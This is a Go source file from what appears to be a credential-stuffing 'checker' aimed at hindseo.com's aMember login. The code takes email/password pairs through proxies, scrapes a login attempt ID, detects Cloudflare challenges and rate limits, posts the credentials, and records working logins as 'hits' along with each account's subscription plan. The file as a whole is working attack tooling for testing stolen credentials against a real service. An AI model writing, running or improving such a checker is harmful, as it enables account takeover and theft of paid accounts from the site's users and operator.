package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

func (c *Checker) checkHindseo(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	sessionOpen := false
	defer deferAmemberSession(client, c, &sessionOpen, c.cfg.BaseURL(), "https://hindseo.com")()

	loginURL := c.cfg.LoginURL()
	referer := c.cfg.Var("login_referer", c.cfg.BaseURL()+"/login")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	attemptID, err := parseNoxtoolsLoginAttemptID(loginBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	finalURL, postBody, postStatus, err := c.postAmemberLoginWithAttemptID(client, loginURL, email, password, attemptID, referer)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseNoxtoolsLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !amemberLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — still on sign-in page"
		return result
	}
	sessionOpen = true

	result.AccountEmail = email
	planInfo := c.fetchAmemberShopPlanInfo(client, postBody)
	result.PlanName, result.PlanLabel = formatAmemberShopPlanResult(planInfo)
	result.Status = StatusHit
	return result
}

func (c *Checker) postAmemberLoginWithAttemptID(client *http.Client, loginURL, email, password, attemptID, referer string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("amember_login", email)
	form.Set("amember_pass", password)
	form.Set("login_attempt_id", attemptID)
	form.Set("_referer", referer)

	req, err := http.NewRequest(http.MethodPost, loginURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	req.Header.Set("User-Agent", c.cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", c.cfg.BaseURL())
	req.Header.Set("Referer", loginURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}
